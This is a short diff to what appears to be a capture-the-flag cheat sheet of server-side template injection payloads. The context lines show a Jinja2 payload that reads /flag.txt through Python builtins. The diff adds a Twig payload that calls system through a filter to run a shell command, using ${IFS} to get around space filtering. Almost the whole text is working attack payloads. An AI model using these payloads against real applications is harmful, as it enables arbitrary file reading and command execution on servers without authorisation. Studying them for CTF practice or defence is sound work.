@@ -18,5 +18,11 @@
  {{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
  ```
 
+### Twig
+
+```py
+{{['cat${IFS}/flag.txt']|filter('system')}}
+```
+
 ![image](https://github.com/user-attachments/assets/d812c5f3-2f59-476a-a1e8-6a7ae978695a)
 
